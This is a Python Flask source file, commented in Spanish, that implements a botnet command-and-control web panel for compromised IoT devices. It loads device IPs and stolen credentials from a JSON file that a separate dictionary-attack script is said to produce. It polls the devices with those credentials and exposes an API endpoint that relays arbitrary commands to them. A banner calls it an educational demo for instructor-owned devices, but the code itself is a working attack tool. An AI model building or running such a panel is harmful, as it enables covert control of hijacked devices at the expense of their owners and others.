#!/usr/bin/env python3
"""
BOTNET WEB CONTROLLER - Panel Web de Control de Botnet
Interfaz web para monitorear y controlar dispositivos IoT comprometidos
"""

from flask import Flask, render_template_string, jsonify, request
import json
import requests
from datetime import datetime
from requests.auth import HTTPBasicAuth
import threading
import time

app = Flask(__name__)

# Cargar bots comprometidos
BOTS = []
STATS = {
    'total_bots': 0,
    'online_bots': 0,
    'offline_bots': 0,
    'total_attacks': 0,
    'last_update': None
}

def load_bots():
    """Carga bots desde archivo JSON"""
    global BOTS
    try:
        with open('compromised_devices.json', 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                BOTS = data
            elif isinstance(data, dict) and 'compromised_devices' in data:
                BOTS = data['compromised_devices']
            else:
                BOTS = []
    except:
        # Sin bots por defecto - deben venir de compromised_devices.json
        BOTS = []
        print("[!] No se encontró archivo compromised_devices.json")
        print("[*] Ejecuta primero real_dictionary_attack.py para generar el archivo")
    
    update_stats()

def check_bot_status(bot):
    """Verifica si un bot está en línea"""
    try:
        url = f"http://{bot['ip']}:{bot.get('port', 80)}/"
        auth = HTTPBasicAuth(bot['username'], bot['password'])
        response = requests.get(url, auth=auth, timeout=2)
        return response.status_code == 200
    except:
        return False

def update_stats():
    """Actualiza estadísticas de bots"""
    global STATS
    STATS['total_bots'] = len(BOTS)
    STATS['online_bots'] = sum(1 for bot in BOTS if check_bot_status(bot))
    STATS['offline_bots'] = STATS['total_bots'] - STATS['online_bots']
    STATS['last_update'] = datetime.now().isoformat()

# HTML Template para el panel
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Botnet Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            padding: 30px;
        }
        h1 {
            color: #667eea;
            margin-bottom: 10px;
            text-align: center;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-style: italic;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-card h3 {
            font-size: 14px;
            opacity: 0.9;
            margin-bottom: 10px;
        }
        .stat-card .value {
            font-size: 32px;
            font-weight: bold;
        }
        .bots-grid {
            display: grid;
            gap: 20px;
            margin-top: 30px;
        }
        .bot-card {
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 20px;
            background: #f9f9f9;
        }
        .bot-card.online {
            border-color: #4caf50;
            background: #f1f8f4;
        }
        .bot-card.offline {
            border-color: #f44336;
            background: #fff5f5;
        }
        .bot-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .bot-ip {
            font-size: 18px;
            font-weight: bold;
            color: #333;
        }
        .status-badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .status-online {
            background: #4caf50;
            color: white;
        }
        .status-offline {
            background: #f44336;
            color: white;
        }
        .bot-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        .info-item {
            padding: 8px;
            background: white;
            border-radius: 4px;
        }
        .info-label {
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
        }
        .info-value {
            font-size: 14px;
            font-weight: bold;
            color: #333;
        }
        .controls {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover {
            background: #5568d3;
        }
        .btn-danger {
            background: #f44336;
            color: white;
        }
        .btn-danger:hover {
            background: #d32f2f;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: #856404;
        }
        .auto-refresh {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Botnet Control Panel</h1>
        <p class="subtitle">Panel de Control y Monitoreo de Dispositivos IoT</p>
        
        <div class="warning">
            ⚠️ <strong>ADVERTENCIA:</strong> Este es un panel de demostración educativa. 
            Solo debe usarse en entornos controlados con dispositivos de propiedad del instructor.
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total de Bots</h3>
                <div class="value" id="total-bots">{{ stats.total_bots }}</div>
            </div>
            <div class="stat-card">
                <h3>Bots en Línea</h3>
                <div class="value" id="online-bots">{{ stats.online_bots }}</div>
            </div>
            <div class="stat-card">
                <h3>Bots Offline</h3>
                <div class="value" id="offline-bots">{{ stats.offline_bots }}</div>
            </div>
            <div class="stat-card">
                <h3>Última Actualización</h3>
                <div class="value" style="font-size: 14px;" id="last-update">{{ stats.last_update }}</div>
            </div>
        </div>
        
        <div class="bots-grid" id="bots-grid">
            {% for bot in bots %}
            <div class="bot-card {{ 'online' if bot.status else 'offline' }}">
                <div class="bot-header">
                    <div class="bot-ip">{{ bot.ip }}</div>
                    <span class="status-badge {{ 'status-online' if bot.status else 'status-offline' }}">
                        {{ 'EN LÍNEA' if bot.status else 'OFFLINE' }}
                    </span>
                </div>
                <div class="bot-info">
                    <div class="info-item">
                        <div class="info-label">Tipo</div>
                        <div class="info-value">{{ bot.device_type }}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Usuario</div>
                        <div class="info-value">{{ bot.username }}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Puerto</div>
                        <div class="info-value">{{ bot.port }}</div>
                    </div>
                </div>
            </div>
            {% endfor %}
        </div>
        
        <div class="auto-refresh">
            Actualización automática cada 5 segundos
        </div>
    </div>
    
    <script>
        // Auto-refresh cada 5 segundos
        setInterval(function() {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Página principal del panel"""
    update_stats()
    
    # Agregar estado a cada bot
    bots_with_status = []
    for bot in BOTS:
        bot_copy = bot.copy()
        bot_copy['status'] = check_bot_status(bot)
        bots_with_status.append(bot_copy)
    
    return render_template_string(HTML_TEMPLATE, bots=bots_with_status, stats=STATS)

@app.route('/api/stats')
def api_stats():
    """API para obtener estadísticas"""
    update_stats()
    return jsonify(STATS)

@app.route('/api/bots')
def api_bots():
    """API para obtener lista de bots"""
    bots_with_status = []
    for bot in BOTS:
        bot_copy = bot.copy()
        bot_copy['status'] = check_bot_status(bot)
        bots_with_status.append(bot_copy)
    
    return jsonify(bots_with_status)

@app.route('/api/bot/<ip>/status')
def bot_status(ip):
    """API para verificar estado de un bot específico"""
    bot = next((b for b in BOTS if b['ip'] == ip), None)
    if not bot:
        return jsonify({'error': 'Bot no encontrado'}), 404
    
    status = check_bot_status(bot)
    return jsonify({
        'ip': ip,
        'status': status,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/bot/<ip>/control', methods=['POST'])
def bot_control(ip):
    """API para enviar comandos a un bot"""
    bot = next((b for b in BOTS if b['ip'] == ip), None)
    if not bot:
        return jsonify({'error': 'Bot no encontrado'}), 404
    
    if not check_bot_status(bot):
        return jsonify({'error': 'Bot offline'}), 400
    
    data = request.json
    command = data.get('command', '')
    
    try:
        url = f"http://{bot['ip']}:{bot.get('port', 80)}{command}"
        auth = HTTPBasicAuth(bot['username'], bot['password'])
        response = requests.get(url, auth=auth, timeout=2)
        
        return jsonify({
            'success': True,
            'status_code': response.status_code,
            'message': f'Comando ejecutado: {command}'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

def main():
    """Función principal"""
    print("=" * 60)
    print("    BOTNET WEB CONTROLLER - Panel de Control Web")
    print("=" * 60)
    
    load_bots()
    
    print(f"[*] Cargados {len(BOTS)} bots")
    print(f"[*] Iniciando servidor web en http://localhost:5000")
    print(f"[*] Presiona Ctrl+C para detener\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    main()

